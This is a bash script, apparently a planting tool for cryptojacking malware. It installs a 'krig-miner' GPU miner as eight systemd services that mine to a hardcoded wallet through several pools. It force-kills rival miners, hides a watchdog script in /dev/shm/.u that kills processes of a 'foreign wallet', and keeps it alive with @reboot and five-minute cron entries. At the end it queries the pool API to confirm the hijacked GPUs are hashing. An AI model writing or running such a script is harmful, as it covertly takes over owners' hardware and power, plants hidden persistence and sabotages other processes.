#!/bin/bash
set +e
WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
PREFIX=ul-t2-123-184-7-135
U=/dev/shm/.u
echo "### KRIG-PLANT $(date -u +%FT%TZ)"
echo "### DIAG-ULX"
journalctl -u ulx-g0 -n 25 --no-pager 2>/dev/null
ls -la "$U"/ 2>/dev/null | head -10
echo "### KIT"
ls -la /opt/arsenal/miners/krig/ 2>/dev/null | head -10
ls -la /opt/t19/krig/ 2>/dev/null | head -5
K=/opt/arsenal/miners/krig
[ -x "$K/krig-miner" ] || K=/opt/t19/krig
[ -x "$K/krig-miner" ] || { echo "NO KRIG KIT"; exit 1; }
echo "KIT=$K"

# clean the field once
systemctl stop plh-card@0 plh-card@1 plh-card@2 plh-card@3 plh-card@4 plh-card@5 plh-card@6 plh-card@7 2>/dev/null
for i in 0 1 2 3 4 5 6 7; do systemctl stop ulx-g$i 2>/dev/null; done
ps -eo pid,args | grep -E 'wildrig-multi|krig-miner|run_gpu' | grep -v grep | awk '{print $1}' | while read -r p; do kill -KILL "$p" 2>/dev/null; done
sleep 3

d=0
while [ $d -lt 8 ]; do
cat > /etc/systemd/system/ulx-g$d.service <<EOS
[Unit]
Description=ulx krig gpu $d
After=network-online.target
[Service]
Type=simple
Nice=10
WorkingDirectory=$K
ExecStart=$K/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user $WALLET/$PREFIX-g$d --password x -d $d --api-port 126$d
Restart=always
RestartSec=20
[Install]
WantedBy=multi-user.target
EOS
  systemctl daemon-reload 2>/dev/null
  systemctl enable --now ulx-g$d 2>/dev/null
  echo "start ulx-g$d"
  d=$((d+1)); sleep 1
done

# watchdog: only foreign wallet
cat > "$U/watch.sh" <<EOS
#!/bin/bash
ps -eo pid,args | grep -E 'prl1p6grd5zl|plh-123-184' | grep -v grep | awk '{print \$1}' | xargs -r kill -KILL 2>/dev/null
for i in 0 1 2 3 4 5 6 7; do systemctl is-active --quiet ulx-g\$i || systemctl start ulx-g\$i 2>/dev/null; done
EOS
chmod +x "$U/watch.sh"
systemctl restart ulx-watch 2>/dev/null
( crontab -l 2>/dev/null | grep -vE 'watch.sh|sample.sh'; echo "@reboot /bin/bash $U/watch.sh >/dev/null 2>&1"; echo "*/5 * * * * /bin/bash $U/watch.sh >/dev/null 2>&1"; echo "*/10 * * * * /bin/bash $U/sample.sh >/dev/null 2>&1" ) | crontab - 2>/dev/null

sleep 80
echo "### UNITS"
for i in 0 1 2 3 4 5 6 7; do printf 'ulx-g%s=%s ' $i "$(systemctl is-active ulx-g$i 2>/dev/null)"; done; echo
echo "### JOURNAL"
for i in 0 1 7; do echo "--- ulx-g$i"; journalctl -u ulx-g$i -n 8 --no-pager 2>/dev/null; done
echo "### GPU"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader 2>&1
echo "### KRYPTEX-API-FROM-HOST"
curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$WALLET" | python3 -c '
import json,sys
try: d=json.load(sys.stdin)["results"]
except Exception as e: print("parse",e); raise SystemExit
for r in d:
    if "123-184-7-135" in r["worker"]:
        print(r["worker"], r["status"], "valid=",r["valid"], "last_share=",r["last_share"], "hr30m=",r["avg_hashrate_30m"], "agent=",r["agent"])
' 2>&1 | head -20
echo "### DONE-KRIGPLANT"
